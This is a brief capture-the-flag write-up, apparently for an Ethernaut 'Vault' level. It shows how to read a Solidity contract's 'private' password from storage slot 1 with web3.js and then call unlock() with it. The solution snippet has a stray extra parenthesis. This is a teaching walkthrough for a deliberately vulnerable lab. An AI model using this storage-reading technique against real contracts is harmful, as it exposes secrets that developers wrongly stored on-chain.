> Unlock the vault to pass the level!

And how do we do that? The answer is going to be getting the correct password into the `unlock()` function, obviously. 

We can see that this contract's `password` is set upon construction - the problem is that it's private (`bytes 32 private password`).

Now, if `password` was `internal`, we could create a contract that inherited from the `Vault` contract, access the `password`, and `unlock` it. `private` variables can only be accessed by the contract they're on.

### Blockchains are PUBLIC LEDGERS
There is no truly *private* piece of data on a blockchain, the `password` is stored in the contract's **storage** *somewhere*. We just have to find a craft way of accessing it.

Storage elements are indexed in the order they're defined in:
```javascript
// index 0
bool public locked;
//index 1
bytes32 private password;
```

## Solution
1. `web3.js` provides us with a simple method retreiving a contract's storage. We run the following in the console:
```javascript
const myInstance = "<YOUR CONTRACT INSTANCE>"

// the second argument is the index
await web3.eth.getStorageAt(myInstance, 1, 
function(error, result) { password = result }))
```
2. You now have the password 😎. Run the unlock function to open the vault.
```javascript
await contract.unlock(password)
```